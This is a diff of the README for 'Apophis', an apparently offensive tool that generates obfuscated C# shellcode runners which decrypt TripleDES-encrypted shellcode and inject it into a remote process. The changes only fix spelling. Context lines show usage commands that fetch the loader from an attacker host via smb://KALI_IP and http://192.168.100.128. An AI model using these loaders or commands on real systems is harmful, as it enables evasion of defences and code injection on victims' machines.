@@ -1,5 +1,5 @@
 # Description
-```Apophiis``` project is bash script shellcode runner generator that uses various tools in the background such as ```DotNetToJScript```, ```ConfuserEx```, ```Net-Obfuscator``` etc. It contains Csharp templates that are compiled with **Mono .Net Framework**. 
+```Apophis``` project is bash script shellcode runner generator that uses various tools in the background such as ```DotNetToJScript```, ```ConfuserEx```, ```Net-Obfuscator``` etc. It contains Csharp templates that are compiled with **Mono .Net Framework**. 
 
 Apep (also spelled Apepi or Aapep) or Apophis (/əˈpoʊfɪs/;[1] Ancient Greek: Ἄποφις) was the ancient Egyptian deity who embodied chaos (ı͗zft in Egyptian) and was thus the opponent of light and Ma'at (order/truth). He appears in art as a giant serpent. His name is reconstructed by Egyptologists as *ʻAʼpāp(ī), as it was written ꜥꜣpp(y) and survived in later Coptic as Ⲁⲫⲱⲫ Aphōph.[2] Apep was first mentioned in the Eighth Dynasty, and he was honored in the names of the Fourteenth Dynasty king 'Apepi and of the Greater Hyksos king Apophis. - https://en.wikipedia.org/wiki/Apep
 
@@ -171,7 +171,7 @@ cmd> des_decryptor.exe smb://KALI_IP/des_decryptor_embedded_marshal.exe
 ```
 
 ### 1.1.2 Execution of des_decryptor_embedded.exe
-The executable ```des_decryptor_embeded.exe``` embeds the shellcode in base64, which before was ecrypted with ```TripleDESEncryptor.ps1```. Doesn't need command-line arguments for the execution. 
+The executable ```des_decryptor_embedded.exe``` embeds the shellcode in base64, which before was ecrypted with ```TripleDESEncryptor.ps1```. Doesn't need command-line arguments for the execution. 
 
 ```
 It will inject the shellcode into the remote process that you have provided in the line 11 of apophis.sh
@@ -408,7 +408,7 @@ If everything goes well then:
 |-------------------------------------------------------------------------------------------------------------------------------------|
 | [1] Example: des_decryptor.exe "http://192.168.100.128/des_decryptor_embedded.exe"                                                  |
 | [2] Example: des_decryptor.exe "http://192.168.100.128/des_decryptor_embedded_marshal.exe"                                          |
-| [3] Example: des_decryptor_embeded.exe                                                                                              |
+| [3] Example: des_decryptor_embedded.exe                                                                                              |
 | [4] Example: des_decryptor_embedded_marshal.exe                                                                                     |
 |_____________________________________________________________________________________________________________________________________|
 
